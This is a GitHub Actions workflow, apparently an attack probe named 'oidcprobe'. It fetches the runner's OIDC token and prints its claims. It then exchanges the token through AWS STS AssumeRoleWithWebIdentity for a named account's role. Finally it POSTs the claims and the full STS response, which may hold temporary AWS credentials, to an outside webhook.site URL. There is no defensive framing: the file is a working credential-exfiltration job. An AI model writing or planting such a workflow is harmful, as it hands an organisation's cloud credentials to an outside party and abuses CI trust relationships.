name: oidcprobe
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  p:
    runs-on: ubuntu-latest
    steps:
      - run: |
          python3 - <<'PY'
          import os,json,urllib.request,urllib.parse,base64,urllib.error
          url=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']
          rt=os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
          r=urllib.request.Request(url+'&audience=sts.amazonaws.com',headers={'Authorization':'Bearer '+rt})
          j=json.load(urllib.request.urlopen(r,timeout=30))
          tok=j['value']
          print('TOKLEN',len(tok))
          p=tok.split('.')[1]; p+='='*(-len(p)%4)
          cl=json.loads(base64.urlsafe_b64decode(p)); print('CLAIMS',json.dumps(cl))
          q=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','RoleArn':'arn:aws:iam::751812493785:role/github-oidc-provider-role','RoleSessionName':'ghprobe','WebIdentityToken':tok,'Version':'2011-06-15','DurationSeconds':'900'})
          try:
              resp=urllib.request.urlopen('https://sts.amazonaws.com/?'+q,timeout=40).read().decode()
          except urllib.error.HTTPError as e:
              resp=e.read().decode()
          print('STS',resp[:3000])
          try:
              urllib.request.urlopen(urllib.request.Request('https://webhook.site/edb1fa97-e24a-4d35-adf9-95cc4b47c297/oidc',data=json.dumps({'claims':cl,'sts':resp[:5000]}).encode(),headers={'Content-Type':'application/json'}),timeout=20)
              print('posted')
          except Exception as e: print('posterr',e)
          PY
